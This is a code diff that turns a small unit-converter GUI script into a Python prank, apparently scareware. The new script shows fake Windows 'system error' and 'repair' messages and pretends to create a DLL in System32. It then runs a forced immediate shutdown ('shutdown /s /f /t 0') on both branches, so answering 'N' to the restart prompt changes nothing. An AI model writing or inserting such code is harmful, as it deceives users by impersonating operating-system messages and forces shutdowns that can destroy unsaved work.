@@ -1,41 +1,66 @@
-import customtkinter as ctk
-from WINDOWS import Temperature as temp
-from WINDOWS import RAINBOW as rain
-from WINDOWS import Dist as dist
-from WINDOWS import MASS as time8
+import os 
+import sys
+import time
+import subprocess
+import random
 
 
-root = ctk.CTk()
-root.geometry("400x400")
-root.title("CustomTkinter")
+def progressbar():
+  P1 = "[#][_][_][_][_]"
+  P2 = "[#][#][_][_][_]"
+  P3 = "[#][#][#][_][_]"
+  P4 = "[#][#][#][#][_]"
+  P5 = "[#][#][#][#][#]"
 
-def setup(R,C):
-  for i in range(R):
-    root.grid_rowconfigure(i, weight=1)
-  for i in range(C):
-    root.grid_columnconfigure(i, weight=1)
-setup(5,5)
+  # Print each progress state, overwrite the previous one
+  for P in [P1, P2, P3, P4, P5]:
+      sys.stdout.write(f"\r{P}")  # \r moves the cursor to the start of the line
+      sys.stdout.flush()  # Force the output to be written immediately
+      time.sleep(0.5)  # Wait for a moment before updating
+  print(" ")
+
+def makefile():
+  print("Making file...")
+  time.sleep(0.5)
+  progressbar()
+  
+  for _ in range(30):
+    line = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=30))
+    print(line)
+    
+    
     
 
-lable = ctk.CTkLabel(root, text="Unit Converter")
-lable.grid(row=0, column=2)
 
 
-temp_button = ctk.CTkButton(root, text="Temperature", command=lambda: temp.setup(root))
-temp_button.grid(row=0, column=2)
+print("SYSTEM ERROR : UNKNOWN")
+print("OS.SYSTEM.REPAIR : IDENTIFYING ERROR")
+progressbar()
+print("ERROR IDENTIFIED : SYSTEM ERROR : FILE MISSING")
+print("FILE DIRECTORY NOT FOUND")
+print("C:/WINDOWS/SYSTEM32/winfix.dll")
+print("Repairing...")
+makefile()
+print("FILE MADE AT C:/WINDOWS/SYSTEM32/winfix.dll")
+print("Repair of FILE has been completed")
+print("To Finish the Repair Windows Must restart")
+if input("Would you like to restart? (Y/N) ").capitalize() == "Y":
+  print("Restarting...")
+  time.sleep(3)
+  os.system('shutdown /s /f /t 0')
 
-rain_button = ctk.CTkButton(root, text="Rainbow", command=lambda: rain.setup(root))
-rain_button.grid(row=2, column=2)
-
-dist_button = ctk.CTkButton(root, text="Distance", command=lambda: dist.setup(root))
-dist_button.grid(row=1, column=2)
-
-useless = ctk.CTkButton(root, text="Mass", command=lambda: time8.setup(root))
-useless.grid(row=3, column=2)
-
-
-
-
-
-
-root.mainloop()
+else:
+  print("System Repair Complete")
+  print("Repair Trigger")
+  print("SYSTEM : SYSTEM FILE MISSING")
+  print("Windows was unable to find a critical system file")
+  print("Do Not Close This Window!")
+  print("Windows is scanning for errors in the backround if a error is found the system will restart")
+  time.sleep(5)
+  print("ERROR FOUND : RUNTIME ERROR")
+  for _ in range(30):
+    line = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789', k=30))
+    print(line)
+  os.system('shutdown /s /f /t 0')
+  
+  
